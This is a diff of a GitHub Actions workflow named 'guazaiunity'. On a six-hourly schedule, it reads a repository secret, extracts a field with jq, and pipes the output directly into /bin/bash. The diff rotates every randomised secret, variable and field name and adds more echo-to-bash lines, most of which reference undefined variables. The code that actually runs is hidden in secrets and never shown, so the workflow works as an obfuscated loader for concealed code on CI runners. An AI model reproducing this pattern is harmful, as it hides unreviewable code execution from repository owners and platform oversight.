@@ -1,11 +1,10 @@
 name: guazaiunity
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 1/6 * * *'
+    - cron: '48 0/6 * * *'
 
-jobs:  # 9576
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,13 +12,17 @@ jobs:  # 9576
       - uses: actions/checkout@v4
       - name: guazaiunity
         env:
-          iqaqq3323: ${{ secrets.iqaqq3323 }}
+          iub2: ${{ secrets.iub2 }}
         run: |
-          echo $iqaqq3323 | jq -r .yg9 | /bin/bash
-          echo $qga91525 | jq -r .gwes37 | /bin/bash
-          echo $l37 | jq -r .zqvc46669 | /bin/bash
-          echo $hy44366 | jq -r .ps57 | /bin/bash
-          echo $ctlmp38864 | jq -r .cym16 | /bin/bash
-          echo $aszx5443 | jq -r .zhqhf542 | /bin/bash
-          echo $zbqwo9 | jq -r .elfcc00 | /bin/bash
+          echo $iub2 | jq -r .thyhm03698 | /bin/bash
+          echo $vju9 | jq -r .nz6 | /bin/bash
+          echo $rexo11 | jq -r .ghg4 | /bin/bash
+          echo $b424 | jq -r .p1471 | /bin/bash
+          echo $u440 | jq -r .d0695 | /bin/bash
+          echo $athf920 | jq -r .q7482 | /bin/bash
+          echo $sk4 | jq -r .amgby259 | /bin/bash
+          echo $cjgpx1 | jq -r .bbd69 | /bin/bash
+          echo $lo35388 | jq -r .k4 | /bin/bash
+          echo $ajmq66459 | jq -r .zjs5 | /bin/bash
+          echo $cs0800 | jq -r .n3702 | /bin/bash
 
